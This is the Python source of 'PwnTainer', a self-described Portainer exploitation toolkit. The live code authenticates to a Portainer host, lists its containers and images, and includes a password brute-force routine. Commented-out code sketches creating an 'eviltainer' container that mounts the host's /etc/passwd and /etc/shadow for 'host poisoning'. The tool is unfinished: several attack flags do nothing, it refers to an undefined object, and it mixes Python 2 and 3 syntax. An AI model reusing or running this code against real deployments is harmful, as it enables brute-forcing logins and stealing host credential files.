from multiprocessing import Pool
from pprint import pprint
from pyfiglet import Figlet
import argparse
import json
import sys
from terminaltables import AsciiTable

from modules import auth
from modules import containers
from modules import image

while True:
    font = Figlet(font='graffiti')
    print(font.renderText('PwnTainer'))
    break


def bruteforce(pw_list):
	with open(pw_list) as pass_list:
		passwords = pass_list.readlines()

	with Pool(4) as pool:
		results = pool.map(a.login, passwords)
		print(results)

def list_containers(host, token):
	cont = containers.Containers(host, 1, token)
	container_list = cont.list_containers()
	container_table = [["Name", "Image", "Network", "IPAddress", "Command"]]
	for con in container_list:
		data = []
		data.append(con['Names'][0])
		data.append(con['Image'])
		data.append(list(con['NetworkSettings']['Networks'].keys())[0])
		data.append(con['NetworkSettings']['Networks'][list(con['NetworkSettings']['Networks'].keys())[0]]['IPAddress'])
		data.append(con['Command'])
		container_table.append(data)
	table = AsciiTable(container_table)
	print(table.table)

def list_images(host, token):
	imgs = image.Image(host, 1, token)
	image_list = imgs.list_images()
	image_table = [["Name"]]
	for img in image_list:
		img_d = []
		img_d.append(img['RepoTags'][0])
		image_table.append(img_d)
	table = AsciiTable(image_table)
	print(table.table)


def check_image(name):
	img = image.Image(sys.argv[1], sys.argv[2])
	images = []
	for imag in img.list_images():
		images.append(imag['RepoTags'])
	for im in images:
		if name in str(im[0]):
			return True
		else:
			pass

def pull_image(name):
	img = image.Image(sys.argv[1], 1)
	img.pull_image(name)


def commads():
	_parser = argparse.ArgumentParser(prog='Pwntainer', usage='%(prog)s Host [options]' , description='Portainer exploitaion toolkit: ')
	_parser.add_argument('Host', help='Enter the address of the container running the portainer:192.168.25.101:9000 ')
        
	_authentication = _parser.add_argument_group('Authentication',)
	_authentication.add_argument('-p' , '--password', metavar=''  ,help='If the default username is admin, provide a passwor: ',  required=True)
	_authentication.add_argument('-l' , '--passlist', metavar=''  ,help='provide a passlist incase of brutefoce')

    
	_containers = _parser.add_argument_group('Information Gathering')
	_containers.add_argument('-C' , '--list-containers', dest='listc', help='List containers in the edpoint.', action='store_true')
	_containers.add_argument('-I' , '--list-images', dest='listi', help='List available images in the target endpoint. ', action='store_true')
	_containers.add_argument('-N' , '--list-networks' , help='List networks in the remote target endpoint. ', action ='store_true')

	_attack = _parser.add_argument_group('Attacks Surfac')
	_attack.add_argument('-pj' , '--pwnwithJohn', metavar='')
	_attack.add_argument('-wp' , '--webpwn', metavar='')
	_attack.add_argument('-sp' , '--sshpwn', metavar='')
	_attack.add_argument('-a', '--all', metavar='')
        
	_commands = _parser.parse_args()
        
	if _commands.Host and _commands.password:
		_authenticate = auth.Auth(_commands.Host)
		_authenticate.login(_commands.password)
		print('\033[1;35;40m[*]Authenticated.')
                    
		_token = str(_authenticate.get_jwt())
		_images = image.Image(_commands.Host, 1, _token)

			
	if _commands.listc:
		print("[*] Getting a list of containers in the remote target...")
		list_containers(_commands.Host, _token)
		print("[+] Done!\n")

	"""
	elif _commands.creat:
		_containerName = raw_input('\033[1;33;40m[+]Enter container to create: ')
		_mountVolume = raw_input('\033[1;33;40m[+]Enter the volume to mount: ')
		_container.create_container(_containerName, _mountVolume)
	"""

	"""
	elif _commands.start:
		print'\033[1;35;40m[*]Starting containers..'
		if _container.start_container() == 'True':
			print'\033[1;35;40m[*]Container successfully started.'
		else:
			print'\033[1;31;40m[-]Unable to start container...'
	"""

	if _commands.listi:
		print("[*] Getting a list of docker images present...")
		list_images(_commands.Host, _token)
		print("[+] Done!")
	
	"""
	elif _commands.pull:
		_imageName = raw_input('\033[1;33;40m[+]Enter the image to pull: ')
		print '\033[1;33;40m[+]Pulling {} this will take some time...'.format(_imageName)
		
				def check_image(_imageName):
                    _images.pull_image(_imageName)
                    if 'success':
                        print'\033[1;35;40m[*]Image pulled.'
                    else :
                        print'\033[1;31;40m[-] {}'.format(_pull)
	
	elif _commands.delete:
		_imageName = raw_input('\033[1;33;40m[+]Enter the image to delete: ')
		_images.remove_image(_imageName)
	"""

	



def main():
	commads()
	"""
        print("\n")
	print("[*] Checking if the evil pwntainer image exists...")
	if check_image("ubuntu:18.04"):
		print("[+] Pwntainer evil image exists")
	else:
		print("[-] Evil pwnstainer image not found, fetching...")
		pull_image("ubuntu:18.04")
		print("[+]Image pull successful")

	# Start the evil container, mounting the various host filesystems.
	pwntainer = containers.Containers(sys.argv[1], 1)
	print("[*] Starting the pwntainer evil container")
	pwntainer.create_container("eviltainer", ["/etc/passwd:/etc/passwd", "/etc/shadow:/etc/shadow"])
	print("[+] Evil container created successfully")
	print("[*] Starting the eviltainer container")
	pwntainer.start_container()
	print("[*] Starting host poisoning")
	# Todo exec on container

	"""
if __name__=="__main__":
	main()
